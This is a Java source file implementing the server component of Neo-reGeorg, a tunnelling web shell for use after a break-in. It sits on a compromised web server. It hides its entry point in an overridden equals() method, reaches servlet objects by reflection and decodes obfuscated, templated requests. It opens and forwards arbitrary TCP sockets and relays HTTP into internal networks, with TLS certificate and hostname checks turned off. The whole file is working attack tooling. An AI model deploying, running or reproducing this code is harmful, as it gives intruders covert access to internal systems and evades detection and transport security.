import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import javax.net.ssl.*;

/**
 * @Modifier c0ny1, L, BeichenDream
 * @CreateDate 2021-08-17
 * @Description 将 Neo-reGeorg jsp 服务端改为 java 代码，提高兼容性
 */

public class NeoreGeorg implements HostnameVerifier, X509TrustManager {
    private char[] en;
    private byte[] de;

    public static java.util.Map<String,Object> sessions = new java.util.HashMap<String,Object>();


    @Override
    public boolean equals(Object obj) {
        try {
            Object[] args     = (Object[]) obj;
            Object request    = args[0];
            Object response   = args[1];
            en                = (char[])  args[2];
            de                = (byte[])  args[3];
            int HTTPCODE      = (Integer) args[4];
            int READBUF       = (Integer) args[5];
            int MAXREADSIZE   = (Integer) args[6];
            String GeorgHello = (String)  args[7];
            int BLV_L_OFFSET  = (Integer) args[8];

            int USE_REQUEST_TEMPLATE = (Integer) args[9];
            int START_INDEX   = (Integer) args[10];
            int END_INDEX     = (Integer) args[11];

            int DATA          = 1;
            int CMD           = 2;
            int MARK          = 3;
            int STATUS        = 4;
            int ERROR         = 5;
            int IP            = 6;
            int PORT          = 7;
            int REDIRECTURL   = 8;
            int FORCEREDIRECT = 9;


            Writer out = (Writer) invokeMethod(response, "getWriter", new Object[0]);

            Object[] info  = new Object[40];
            Object[] rinfo = new Object[40];
            String requestDataHead = "";
            String requestDataTail = "";
            try {
                if (((int)(Integer)(invokeMethod(request, "getContentLength", new Object[0]))) != -1) {
                    String inputData = "";
                    InputStream in = (InputStream) invokeMethod(request, "getInputStream", new Object[0]);
                    while ( true ){
                        int buffLen = in.available();
                        if (buffLen == -1)
                            break;
                        byte[] buff = new byte[buffLen];
                        if (in.read(buff) == -1)
                            break;
                        inputData += new String(buff);
                    }
                    if (USE_REQUEST_TEMPLATE == 1) {
                        requestDataHead = inputData.substring(0, START_INDEX);
                        requestDataTail = inputData.substring(inputData.length() - END_INDEX, inputData.length());

                        inputData = inputData.substring(START_INDEX);
                        inputData = inputData.substring(0, inputData.length() - END_INDEX);
                    }
                    byte[] data = b64de(inputData);
                    info = blv_decode(data, BLV_L_OFFSET);
                }
            } catch ( Exception e) {
                // out.write(new String(b64de(GeorgHello)));
                out.write(e.toString());
                out.flush();
                out.close();
                return false; // exit
            }

            String rUrl = (String) info[REDIRECTURL];

            if (rUrl != null) {
                String force = (String) info[FORCEREDIRECT];
                if (force.compareTo("TRUE") == 0 || !islocal(rUrl)){
                    info[REDIRECTURL] = null;
                    info[FORCEREDIRECT] = null;
                    invokeMethod(response, "reset", new Object[0]);
                    String method = (String) invokeMethod(request, "getMethod", new Object[0]);
                    URL u = new URL(rUrl);
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    conn.setRequestMethod(method);
                    conn.setDoOutput(true);

                    // ignore ssl verify
                    if (HttpsURLConnection.class.isInstance(conn)){
                        ((HttpsURLConnection)conn).setHostnameVerifier(this);
                        SSLContext ctx = SSLContext.getInstance("SSL");
                        ctx.init(null, new TrustManager[] { this }, null);
                        ((HttpsURLConnection)conn).setSSLSocketFactory(ctx.getSocketFactory());
                    }

                    // conn.setConnectTimeout(200);
                    // conn.setReadTimeout(200);

                    Enumeration enu = (Enumeration) invokeMethod(request, "getHeaderNames", new Object[0]);
                    List<String> keys = Collections.list(enu);
                    Collections.reverse(keys);
                    for (String key : keys){
                        String value = (String) invokeMethod(request, "getHeader", new Object[]{key});
                        conn.setRequestProperty(headerkey(key), value);
                    }

                    if (((int)(Integer)(invokeMethod(request, "getContentLength", new Object[0]))) != -1){
                        OutputStream output;
                        try{
                            output = conn.getOutputStream();
                        }catch(Exception e){
                            return false;
                        }

                        String newData = requestDataHead + b64en(blv_encode(info, BLV_L_OFFSET)) + requestDataTail;
                        byte[] data = newData.getBytes();
                        output.write(data, 0, data.length);
                        output.flush();
                        output.close();
                    }

                    for (String key : conn.getHeaderFields().keySet()) {
                        if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")){
                            String value = conn.getHeaderField(key);
                            invokeMethod(response, "setHeader", new Object[]{key, value});
                        }
                    }

                    InputStream hin;
                    if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
                        hin = conn.getInputStream();
                    } else {
                        hin = conn.getErrorStream();
                        if (hin == null){
                            invokeMethod(response, "setStatus", new Object[]{HTTPCODE});
                            return false;
                        }
                    }

                    int i;
                    byte[] buffer = new byte[1024];
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    while ((i = hin.read(buffer)) != -1) {
                        byte[] data = new byte[i];
                        System.arraycopy(buffer, 0, data, 0, i);
                        baos.write(data);
                    }
                    String responseBody = baos.toString();
                    invokeMethod(response, "addHeader", new Object[]{"Content-Length", Integer.toString(responseBody.length())});
                    invokeMethod(response, "setStatus", new Object[]{conn.getResponseCode()});
                    out.write(responseBody.trim());
                    out.flush();
                    out.close();

                    if ( true ) return false; // exit
                }
            }
            invokeMethod(response, "resetBuffer", new Object[0]);
            invokeMethod(response, "setStatus", new Object[]{HTTPCODE});
            String cmd = (String) info[CMD];
            if (cmd != null) {
                String mark = (String) info[MARK];
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = (String) info[IP];
                        int port = Integer.parseInt((String) info[PORT]);
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.socket().connect(new InetSocketAddress(target, port), 3000); // set timeout 3 seconds, default 120 seconds
                        socketChannel.configureBlocking(false);
                        sessions.put(mark, socketChannel);
                        rinfo[STATUS] = "OK";
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }
                } else if (cmd.compareTo("DISCONNECT") == 0) {
                    SocketChannel socketChannel = (SocketChannel)sessions.get(mark);
                    try{
                        socketChannel.socket().close();
                    } catch (Exception e) {
                    }
                    sessions.remove(mark);
                } else if (cmd.compareTo("READ") == 0){
                    SocketChannel socketChannel = (SocketChannel)sessions.get(mark);
                    try{
                        if ( socketChannel != null ) {
                            ByteBuffer buf = ByteBuffer.allocate(READBUF);
                            int bytesRead = socketChannel.read(buf);
                            int maxRead = MAXREADSIZE;
                            int readLen = 0;
                            ByteArrayOutputStream readData = new ByteArrayOutputStream();
                            while (bytesRead > 0){
                                byte[] block = new byte[bytesRead];
                                System.arraycopy(buf.array(), 0, block, 0, bytesRead);
                                readData.write(block);
                                ((java.nio.Buffer)buf).clear();
                                readLen += bytesRead;
                                if (bytesRead < READBUF || readLen >= maxRead) {
                                    rinfo[DATA] = readData.toByteArray();
                                    break;
                                }
                                bytesRead = socketChannel.read(buf);
                            }
                        }
                        rinfo[STATUS] = "OK";
                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                    }

                } else if (cmd.compareTo("FORWARD") == 0){
                    SocketChannel socketChannel = (SocketChannel)sessions.get(mark);
                    try {
                        byte[] writeData = (byte[]) info[DATA];
                        ByteBuffer buf = ByteBuffer.allocate(writeData.length);
                        buf.put(writeData);
                        buf.flip();

                        while(buf.hasRemaining())
                            socketChannel.write(buf);

                        rinfo[STATUS] = "OK";

                    } catch (Exception e) {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = e.toString();
                        socketChannel.socket().close();
                    }
                }
                out.write(b64en(blv_encode(rinfo, BLV_L_OFFSET)));
                out.flush();
                out.close();
            } else {
                out.write(new String(b64de(GeorgHello)));
                out.flush();
                out.close();
            }
        } catch (Exception e){
        }
        return false;
    }


    public String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;
        int b1, b2, b3;
        while (i < len) {
            b1 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 0x3) << 4]);
                sb.append("==");
                break;
            }
            b2 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[((b1 & 0x03) << 4)
                        | ((b2 & 0xf0) >>> 4)]);
                sb.append(en[(b2 & 0x0f) << 2]);
                sb.append("=");
                break;
            }
            b3 = data[i++] & 0xff;
            sb.append(en[b1 >>> 2]);
            sb.append(en[((b1 & 0x03) << 4)
                    | ((b2 & 0xf0) >>> 4)]);
            sb.append(en[((b2 & 0x0f) << 2)
                    | ((b3 & 0xc0) >>> 6)]);
            sb.append(en[b3 & 0x3f]);
        }
        return sb.toString();
    }


    public byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;
        int b1, b2, b3, b4;
        while (i < len) {
            do {
                b1 = de[data[i++]];
            } while (i < len && b1 == -1);
            if (b1 == -1) {
                break;
            }
            do {
                b2 = de[data[i++]];
            } while (i < len && b2 == -1);
            if (b2 == -1) {
                break;
            }
            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }
                b3 = de[b3];
            } while (i < len && b3 == -1);
            if (b3 == -1) {
                break;
            }
            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }
                b4 = de[b4];
            } while (i < len && b4 == -1);
            if (b4 == -1) {
                break;
            }
            buf.write((int) (((b3 & 0x03) << 6) | b4));
        }
        return buf.toByteArray();
    }


    static String headerkey(String str) throws Exception {
        String out = "";
        for (String block: str.split("-")) {
            out += block.substring(0, 1).toUpperCase() + block.substring(1);
            out += "-";
        }
        return out.substring(0, out.length() - 1);
    }


    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            NetworkInterface nif = nifs.nextElement();
            Enumeration<InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                InetAddress addr = addresses.nextElement();
                if (addr instanceof Inet4Address)
                    if (addr.getHostAddress().equals(ip))
                        return true;
            }
        }
        return false;
    }


    public static Object[] blv_decode(byte[] data, Integer offset) {
        Object[] info = new Object[40];

        int i = 0;
        int data_len = data.length;
        int b;
        byte[] length = new byte[4];

        ByteArrayInputStream dataInput = new ByteArrayInputStream(data);

        while ( i < data_len ) {
            b = dataInput.read();
            dataInput.read(length, 0, length.length);
            int l = bytesToInt(length) - offset;
            byte[] v = new byte[l];
            dataInput.read(v, 0, v.length);
            i += ( 5 + l );
            // 9 is BLVHEAD_LEN
            if ( b > 1 && b <= 9 ) {
                info[b] = new String(v);
            } else {
                info[b] = v;
            }
        }

        return info;
    }


    public static byte[] blv_encode(Object[] info, Integer offset) {
        info[0]  = randBytes(5, 20);
        info[39] = randBytes(5, 20);
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        for (int b = 0; b < info.length; b++) {
            if ( info[b] != null ) {
                Object o = info[b];
                byte[] v;
                if ( o instanceof String ){
                    v = ( (String) o ).getBytes();
                } else {
                    v = (byte[]) o;
                }
                buf.write(b);
                try {
                    buf.write(intToBytes(v.length + offset));
                    buf.write(v);
                }catch(Exception e) {
                }
            }
        }
        return buf.toByteArray();
    }

    public static Object invokeMethod(Object obj, String methodName, Object[] args) throws Exception {
        Class[] argTypes = new Class[args.length];
        for (int i = 0; i < args.length; i++) {
            Class argType = args[i].getClass();
            if(Integer.class.isAssignableFrom(argType)){
                argType = int.class;
            }else if(Long.class.isAssignableFrom(argType)){
                argType = long.class;
            }else if(Short.class.isAssignableFrom(argType)){
                argType = short.class;
            }
            argTypes[i] = argType;
        }
        return invokeMethod2(obj, methodName, argTypes,args);
    }
    public static Object invokeMethod2(Object obj, String methodName, Class[] argTypes, Object[] args) throws Exception {
        Class clazz = obj.getClass();
        Method method = clazz.getMethod(methodName, argTypes);
        if (!method.isAccessible()){
            method.setAccessible(true);
        }
        return method.invoke(obj, args);
    }


    public static byte[] randBytes(int min, int max) {
        Random r = new Random();
        int len = r.nextInt((max - min) + 1) + min;
        byte[] randbytes = new byte[len];
        r.nextBytes(randbytes);
        return randbytes;
    }


    public static int bytesToInt(byte[] bytes) {
        int i;
        i =   (  bytes[3] & 0xff )
            | (( bytes[2] & 0xff ) << 8 )
            | (( bytes[1] & 0xff ) << 16)
            | (( bytes[0] & 0xff ) << 24);
        return i;
    }


    public static byte[] intToBytes(int value) {
        byte[] src = new byte[4];
        src[3] = (byte) (value & 0xFF);
        src[2] = (byte) ((value >> 8) & 0xFF);
        src[1] = (byte) ((value >> 16) & 0xFF);
        src[0] = (byte) ((value >> 24) & 0xFF);
        return src;
    }


    public boolean verify(String s, SSLSession sslSession) {
        return true;
    }


    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

    }


    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
